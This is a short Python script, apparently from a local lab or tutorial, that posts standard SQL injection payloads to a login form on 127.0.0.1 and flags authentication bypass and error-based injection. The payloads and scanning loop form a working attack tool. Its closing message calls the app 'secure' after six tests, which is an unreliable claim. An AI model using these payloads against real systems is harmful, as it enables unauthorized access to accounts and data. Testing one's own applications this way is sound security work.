import requests
import re

TARGET_URL = "http://127.0.0.1:5000/login"

# Standard SQL Injection Payloads to test
PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "' UNION SELECT 1, 'hacked', 'hacked' --",
    "'"  # Intentionally triggers a syntax error for Error-Based testing
]

def scan():
    print(f"[*] Starting SQL Injection Scan on {TARGET_URL}\n")
    
    vulnerabilities_found = 0
    
    for payload in PAYLOADS:
        data = {'username': payload, 'password': 'password'}
        
        try:
            response = requests.post(TARGET_URL, data=data)
            
            # Check 1: Boolean-based / Authentication Bypass Detection
            if "Welcome back" in response.text:
                vulnerabilities_found += 1
                print(f"[!] VULNERABILITY DETECTED (Boolean-Based)!")
                print(f"    Payload: {payload}")
                match = re.findall(r"Welcome back, \w+!", response.text)
                print(f"    Response snippet: {match}\n")
                
            # Check 2: Error-based Detection
            elif "Database Error" in response.text or "syntax error" in response.text:
                vulnerabilities_found += 1
                print(f"[!] VULNERABILITY DETECTED (Error-Based)!")
                print(f"    Payload: {payload}")
                match = re.findall(r"Database Error: .*", response.text)
                print(f"    Error Triggered: {match}\n")
                
        except requests.exceptions.ConnectionError:
            print("[X] Connection Error: Ensure Flask server is running in your other terminal.")
            return

    # Print summary if no vulnerabilities were found
    if vulnerabilities_found == 0:
        print("[✓] Scan Complete: No vulnerabilities detected! The application is secure.")

if __name__ == "__main__":
    scan()